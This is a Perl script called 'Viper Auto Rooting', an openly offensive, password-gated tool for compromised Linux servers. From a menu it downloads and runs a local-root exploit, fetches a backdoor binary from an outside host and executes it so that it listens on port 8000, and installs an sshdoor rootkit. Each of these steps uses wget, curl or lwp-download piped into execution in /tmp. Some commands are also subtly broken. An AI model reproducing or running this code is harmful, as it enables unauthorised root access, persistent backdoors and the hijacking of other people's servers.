#!/usr/bin/perl -w
#
#
#                        +--------------------+
#                          Viper Auto Rooting
#                       +--------------------+
#
#
#
#            program info :
#
#                This Program Is Private
#                Code : perl
#                Contact: Bl4ck.Viper
#                Email : bl4ck.viper@gmail.com
#                
#                
#
#
#                
#
#
#            Description :
#
#                This Program Can  :
#
#                1:Rooting
#                2:Install Backdoor
#                3:Install Rootkit , After Rooting
#
#
#----------------------------------------------------------------------------------+|
print "Enter Password :";
$dl =log <STDIN>;
if ($dl =~ /8.90340751993226/){
print "\t\t[+]--->Viper Auto Rooting<---[+]\n";
print "\t\t[+]-->Coded By Bl4ck.viper<--[+]\n";
print "\t\t[+]--->For My Best Friend<---[+]\n";
    print "[+]Menu :\n";
    print "\t[-]1:Rooting\n";
    print "\t[-]2:install backdoor\n";
    print "\t[-]3:install rootkit , after rooting\n";
    print "\n";
print "Please Select 1,2,3 ? :";
    $userselect = <STDIN>;
    
    if ($userselect==1){&rooting}
    
    if ($userselect==2){&backdoor}
    
    if ($userselect==3){&rootkit}
    
sub rooting
{
print "\t\t[:]Welcome To Rooting Section\n";

    print "Please Insert Localroot Directore [e:g http://www.example.com/localroots]:";
$userdir = <STDIN>;
    print "Please Insert Localroot Name In $userdir Directore [e:g /h00lyshit]:";
$userlocalroot = <STDIN>;
$userdl = $userdir.$userlocalroot;
    print " Your Address Is $userdl ? => y/n :";
        $useraddress = <STDIN>;
        if ($useraddress =~ /y/) {
    print " \tLets Go ...\n";
    if (-x "/usr/bin/wget"){
system ("cd /tmp;mkdir bl4ck.viper;chmod 777 bl4ck.viper;cd bl4ck.viper;wget $userdl;chmod 777 $userlocalroot;./$userlocalroot");
    print "Done!";
system ("id");
}
    else {
    print "Cannot Download Your Local Root With Wget Method !
                        
                        We Are Gonna Use Curl Method ;) \n
        ";
        }
        if (-x "/usr/bin/curl") {
system ("cd /tmp;mkdir bl4ck.viper;chmod 777 bl4ck.viper;cd bl4ck.viper;curl -o userdl;chmod 777 $userlocalroot;./$userlocalroot");
        print "Done!";
system ("id");
        }
        else {
            print "Cannot Download Your Local Root With Curl Method
            
                        We Are Gonna lwp-download Method ;)
        ";
        }
        if (-x "/usr/bin/lwp-download"){
system ("cd /tmp;mkdir bl4ck.viper;chmod 777 bl4ck.viper;cd bl4ck.viper;lwp-download -a userdl;chmod 777 $userlocalroot;./$userlocalroot");
        print "Done!";
system("id");
        }
        else {
            print "Cannot Download Your Local Root With Any Of Method ! :(";
            exit();
        }
        }
    
        
        else {
            if ($useraddress =~ /n/) {
                print "\t\tPlease Repair Address And Try Again ;)"
            }
        }
}

sub backdoor
{
print "\t\t[:]Welcome To Backdoor Section\n";
    print "Are You Ready To Start Install Backdoor ? y/n:";
    $userbss =<STDIN>;
    if ($userbss =~ /y/){
    
    print "\tTest Wget Method ...\n\n";
    if (-x "/usr/bin/wget") {
system ("cd /tmp;mkdir bl4ck.viper-2;chmod 777 bl4ck.viper-2;cd bl4ck.viper-2;wget http://bl4ck-viper.persiangig.com/Toolz/backdoor;chmod 777 backdoor;./backdoor");
    print "Done!";
    print "Can You Cannect To Server With NC At 8000 Port.Port Password Is =hacked";
    }
    else{
        print "Cannot Download Backdoor With Wget Method!
        
                    We Are Gonna Use Curl Method ;)\n";
    }
    if (-x "/usr/bin/curl"){
system ("cd /tmp;mkdir bl4ck.viper-2;chmod 777 bl4ck.viper-2;cd bl4ck.viper-2;curl -o http://bl4ck-viper.persiangig.com/Toolz/backdoor;chmod 777 backdoor;./backdoor");
    print "done!";
    print "Can You Cannect To Server With NC At 8000 Port.Port Password Is ->hacked";  
    }
    else {
        print "Cannot Download Backdoor With Curl Method!
        
                    We Are Gonna Use lwp-download Method ;)\n";
    }
    if (-x "/usr/bin/lwp-download"){
system ("cd /tmp;mkdir bl4ck.viper-2;chmod 777 bl4ck.viper-2;cd bl4ck.viper-2;lwp-download -a http://bl4ck-viper.persiangig.com/Toolz/backdoor;chmod 777 backdoor;./backdoor");
    print "Done!";
    print "Can You Cannect To Server With NC At 8000 Port.Port Password Is =hacked";
    }
    else{
        print "Cannot Download Backdoot Whit Any Method :(\n";
    }
    }
    if ($userbss =~ /n/){
        print "OK !";
        exit();
    }
}
sub rootkit
{
print "\t\t[:]Welcome To Rootkit Section\n";
print "Are You Root NOW ? y/n:";
$sr =<STDIN>;
    if($sr =~ /y/){
        print "Please Insert Password For Rootkit:";
        $rp =<STDIN>;
        print "Please Insert Port For Rootkit:";
        $rpo =<STDIN>;
        if(-x "/usr/bin/wget"){
            system ("cd /tmp;wget http://bl4ck-viper.persiangig.com/Toolz/rootkit.tar.gz;chmod 777 rootkit.tar.gz;tar.gz -zxvfw rootkit.tar.gz;cd sshdoor;./install $rp $rpo");
            print "Done!\n";
            print "You Can Connect To Server ;)\n";
        }
        else{
            print "\tCannot Install Rootkit ! Please Check Access Next Install Rootkit\n";
        }
        
    }
    if ($sr =~ /n/){
        print "First Rooting Next Install Rottkit\n";
    }

    
}
}
else {
    print "Password Is Incorrect!"
}